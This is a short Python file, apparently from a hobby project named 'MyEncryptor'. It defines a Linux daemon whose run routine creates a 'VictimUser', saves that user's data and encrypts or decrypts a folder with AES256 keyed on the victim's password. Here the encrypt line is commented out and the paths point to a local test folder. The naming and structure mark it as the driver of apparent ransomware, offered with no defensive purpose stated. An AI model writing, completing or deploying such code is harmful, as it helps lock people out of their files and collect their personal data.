import Encryptor
import User

class DaemonLinux():

    def __init__(self, tout = 5):
        self.stdin_path = '/dev/null'
        self.stdout_path = '/dev/tty'
        self.stderr_path = '/dev/tty'
        self.pidfile_path = '/tmp/foo.pid'
        self.pidfile_timeout = tout # default = 5

    def run(self):
        user = User.VictimUser()
        user.saveUserData()
        encryptor = Encryptor.AES256(user.Psw);
        #encryptor.encryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
        encryptor.decryptFolder("/home/alessio/PycharmProjects/MyEncryptor/test_encrypt/")
